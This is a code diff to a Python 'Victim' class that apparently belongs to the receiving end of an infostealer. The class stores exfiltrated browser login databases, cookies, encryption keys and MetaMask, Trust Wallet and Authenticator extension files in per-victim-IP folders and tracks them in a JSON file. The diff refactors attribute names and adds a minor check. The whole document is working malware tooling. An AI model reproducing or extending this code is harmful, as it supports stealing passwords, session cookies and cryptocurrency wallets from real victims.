@@ -8,22 +8,22 @@ class Victim:
     __BROWSERDATA = {"HASH": "KEY", "Login Data": "LOGIN.DB", "Cookies": "COOKIES.DB"}
     __EXTENTIONDATA = {"a": "METAMASK", "b": "TRUST WALLER", "c": "AUTHENTICATOR"}
     __StorageFile = "storage.json"
-    __CurrentVictim = {}
-    __data = {}
+    CurrentVictim = {}
+    AllVictims = {}
 
     def __init__(self, ip: str) -> None:
         """Initialization of the Victim class"""
         self.ip = ip
         self.__VictimFolder = self.ip
         self.LoadStorage()
-        if not os.path.exists(self.__VictimFolder):
+        if self.__VictimFolder != None and not os.path.exists(self.__VictimFolder):
             os.mkdir(self.__VictimFolder)
 
     def SaveStorage(self) -> None:
         """Save current data"""
-        self.__data[self.ip] = self.__CurrentVictim
+        self.AllVictims[self.ip] = self.CurrentVictim
         file = open(self.__StorageFile, 'w')
-        json.dump(self.__data, file, indent=4)
+        json.dump(self.AllVictims, file, indent=4)
         file.close()
 
     def LoadStorage(self) -> None:
@@ -32,14 +32,14 @@ class Victim:
             file = open(self.__StorageFile, 'r')
             StorageData = json.load(file)
             if self.ip in StorageData:
-                self.__CurrentVictim = StorageData[self.ip]
+                self.CurrentVictim = StorageData[self.ip]
             else:
-                self.__CurrentVictim = {"browsers": [], "BrowserCount": 0}
-            self.__data = StorageData
+                self.CurrentVictim = {"browsers": [], "BrowserCount": 0}
+            self.AllVictims = StorageData
         except FileNotFoundError:
             file = open(self.__StorageFile, 'w')
             json.dump({}, file, indent=4)
-            self.__CurrentVictim = {"browsers": [], "BrowserCount": 0}
+            self.CurrentVictim = {"browsers": [], "BrowserCount": 0}
         finally:
             file.close()
 
@@ -52,9 +52,9 @@ class Victim:
 
         if FileName in self.__BROWSERDATA:
             if FileName == "HASH":
-                self.__CurrentVictim["BrowserCount"] += 1
-                self.__CurrentVictim["browsers"].append({"extentions": {}, "browserfiles": []})
-            self.__VictimFolder = os.path.join(self.ip, str(self.__CurrentVictim["BrowserCount"]))
+                self.CurrentVictim["BrowserCount"] += 1
+                self.CurrentVictim["browsers"].append({"extentions": {}, "browserfiles": []})
+            self.__VictimFolder = os.path.join(self.ip, str(self.CurrentVictim["BrowserCount"]))
             if not os.path.exists(self.__VictimFolder):
                 os.mkdir(self.__VictimFolder)
             FilePath = os.path.join(self.__VictimFolder, self.__BROWSERDATA[FileName])
@@ -64,7 +64,7 @@ class Victim:
             FileAndDir = FileName.split("\\")
             DirName = self.__EXTENTIONDATA[FileAndDir[0]]
             FileName = FileAndDir[1]
-            self.__VictimFolder = os.path.join(self.ip, str(self.__CurrentVictim["BrowserCount"]))
+            self.__VictimFolder = os.path.join(self.ip, str(self.CurrentVictim["BrowserCount"]))
             ExtentionPathName = os.path.join(self.__VictimFolder, DirName)
             if not os.path.exists(ExtentionPathName):
                 os.mkdir(ExtentionPathName)
@@ -77,12 +77,12 @@ class Victim:
     def LogFile(self, FileName: str, FilePath: str = None):
         """log file to the storage file"""
         if FilePath is not None:
-            extentions = self.__CurrentVictim["browsers"][self.__CurrentVictim["BrowserCount"] - 1]["extentions"]
+            extentions = self.CurrentVictim["browsers"][self.CurrentVictim["BrowserCount"] - 1]["extentions"]
             if FilePath not in extentions:
                 extentions[FilePath] = []
                 extentions[FilePath].append(FileName)
             else:
                 extentions[FilePath].append(FileName)
         else:
-            BrowserFiles = self.__CurrentVictim["browsers"][self.__CurrentVictim["BrowserCount"] - 1]["browserfiles"]
+            BrowserFiles = self.CurrentVictim["browsers"][self.CurrentVictim["BrowserCount"] - 1]["browserfiles"]
             BrowserFiles.append(FileName)
